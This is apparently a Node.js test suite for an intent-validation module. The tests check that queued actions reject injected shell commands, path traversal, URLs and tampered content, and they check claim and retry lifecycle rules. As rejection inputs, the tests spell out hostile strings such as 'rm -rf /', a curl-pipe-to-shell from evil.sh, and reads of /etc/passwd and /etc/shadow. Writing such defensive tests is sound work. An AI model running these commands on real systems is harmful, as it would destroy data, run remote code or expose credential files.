import test from "node:test";
import assert from "node:assert/strict";

import {
  INTENT_KINDS, COMMAND_SHAPES, createIntent, validateIntent,
  claimIntent, resolveIntent, intentIsIntact,
} from "../lib/integrations/intent-protocol.mjs";

const ok = (over = {}) => ({ kind: "objective.start", args: { objective: "Add password reset", projectId: "lifemaxing" }, ...over });

// ── the central rule: an intent names an action, never a command ──────────

test("an unknown kind is rejected, so a new action cannot arrive as data", () => {
  assert.equal(validateIntent({ kind: "shell.exec", args: {} }).ok, false);
  assert.equal(validateIntent({ kind: "__proto__", args: {} }).ok, false);
  assert.equal(validateIntent({ kind: "constructor", args: {} }).ok, false);
});

test("shell metacharacters are refused outright, never sanitised", () => {
  for (const payload of [
    "rm -rf / ; echo done", "build && curl evil.sh | sh", "x `whoami`",
    "y $(cat /etc/passwd)", "z ${HOME}", "line\nsecond", "a > /tmp/out",
  ]) {
    const result = validateIntent(ok({ args: { objective: payload, projectId: "p" } }));
    assert.equal(result.ok, false, `must reject: ${payload}`);
    assert.match(result.reason, /shell-metacharacters/);
  }
});

test("paths, traversal and URLs are refused", () => {
  const cases = [
    ["../../etc/passwd", /path-traversal/],
    ["/etc/shadow", /absolute-path/],
    ["C:\\Windows\\System32", /absolute-path/],
    ["https://evil.example/payload", /url-or-scheme/],
    ["require('child_process')", /module-specifier/],
  ];
  for (const [payload, expected] of cases) {
    const result = validateIntent(ok({ args: { objective: payload, projectId: "p" } }));
    assert.equal(result.ok, false, `must reject: ${payload}`);
    assert.match(result.reason, expected);
  }
});

test("every allowlisted kind declares its arguments, and none is free-form", () => {
  for (const [kind, spec] of Object.entries(INTENT_KINDS)) {
    assert.ok(Array.isArray(spec.args), `${kind} must declare args`);
    for (const arg of spec.args) {
      assert.ok(Number.isFinite(spec.maxLen[arg]), `${kind}.${arg} must declare a length bound`);
    }
  }
});

test("an unexpected argument is rejected, never silently trimmed", () => {
  const result = validateIntent(ok({ args: { objective: "x", projectId: "p", command: "rm -rf /" } }));
  assert.equal(result.ok, false);
  assert.match(result.reason, /unexpected argument\(s\): command/);
});

test("a missing argument is rejected rather than defaulted", () => {
  assert.match(validateIntent({ kind: "task.retry", args: {} }).reason, /missing argument\(s\): taskId/);
});

test("arguments must be strings, so an object cannot smuggle structure", () => {
  assert.match(validateIntent(ok({ args: { objective: { toString: 1 }, projectId: "p" } })).reason, /must be a string/);
  assert.match(validateIntent(ok({ args: { objective: ["a"], projectId: "p" } })).reason, /must be a string/);
});

test("arguments are length-bounded", () => {
  assert.match(validateIntent(ok({ args: { objective: "x".repeat(1001), projectId: "p" } })).reason, /exceeds 1000/);
});

test("nothing in this module executes, resolves a path, or reaches the network", async () => {
  const { readFileSync } = await import("node:fs");
  const src = readFileSync(new URL("../lib/integrations/intent-protocol.mjs", import.meta.url), "utf8");
  for (const forbidden of ["child_process", "node:fs", "node:http", "node:net", "fetch(", "eval(", "new Function"]) {
    assert.doesNotMatch(src, new RegExp(forbidden.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")),
      `intent-protocol.mjs must not be able to ${forbidden}`);
  }
});

// ── integrity ─────────────────────────────────────────────────────────────

test("an intent carries a digest binding it to its content", () => {
  const intent = createIntent(ok());
  assert.equal(intentIsIntact(intent), true);
});

test("a store that mutates an intent between claim and execution is detected", () => {
  const intent = createIntent(ok());
  const tampered = { ...intent, args: { ...intent.args, projectId: "someone-elses-project" } };
  assert.equal(intentIsIntact(tampered), false);
  const claim = claimIntent(tampered, { actorId: "mini-pc" });
  assert.equal(claim.ok, false);
  assert.match(claim.reason, /digest/);
});

// ── lifecycle ─────────────────────────────────────────────────────────────

test("only a pending intent can be claimed", () => {
  const intent = createIntent(ok());
  const claimed = claimIntent(intent, { actorId: "a" }).intent;
  assert.equal(claimed.status, "claimed");
  assert.equal(claimIntent(claimed, { actorId: "b" }).ok, false);
});

test("only the claiming worker may resolve", () => {
  const claimed = claimIntent(createIntent(ok()), { actorId: "a" }).intent;
  assert.throws(() => resolveIntent(claimed, { actorId: "b", outcome: "succeeded" }), /only the claiming worker/);
});

test("a failure returns to pending until the budget is spent, then fails", () => {
  let intent = createIntent(ok());
  for (let i = 0; i < 2; i += 1) {
    intent = claimIntent(intent, { actorId: "a", maxAttempts: 3 }).intent;
    intent = resolveIntent(intent, { actorId: "a", outcome: "failed", error: "boom", maxAttempts: 3 });
    assert.equal(intent.status, "pending");
  }
  intent = claimIntent(intent, { actorId: "a", maxAttempts: 3 }).intent;
  intent = resolveIntent(intent, { actorId: "a", outcome: "failed", maxAttempts: 3 });
  assert.equal(intent.status, "failed");
  assert.equal(claimIntent(intent, { actorId: "a" }).ok, false);
});

test("success is terminal", () => {
  const claimed = claimIntent(createIntent(ok()), { actorId: "a" }).intent;
  const done = resolveIntent(claimed, { actorId: "a", outcome: "succeeded" });
  assert.equal(done.status, "done");
  assert.equal(done.error, null);
});

test("requestedBy is recorded for audit and authorizes nothing", () => {
  const intent = createIntent(ok({ requestedBy: "founder@example.com" }));
  assert.equal(intent.requestedBy, "founder@example.com");
  // The approval gate runs locally on execution; nothing about this field
  // shortcuts it, and no code path here consults it.
  assert.equal(intent.status, "pending");
});

test("createIntent refuses to build something validateIntent would reject", () => {
  assert.throws(() => createIntent({ kind: "objective.start", args: { objective: "a; rm -rf /", projectId: "p" } }), /invalid intent/);
});

test("validateIntent never throws, whatever arrives from the network", () => {
  for (const junk of [null, undefined, 42, "string", [], { kind: 1 }, { kind: "task.retry", args: 5 }]) {
    assert.doesNotThrow(() => validateIntent(junk));
    assert.equal(validateIntent(junk).ok, false);
  }
});
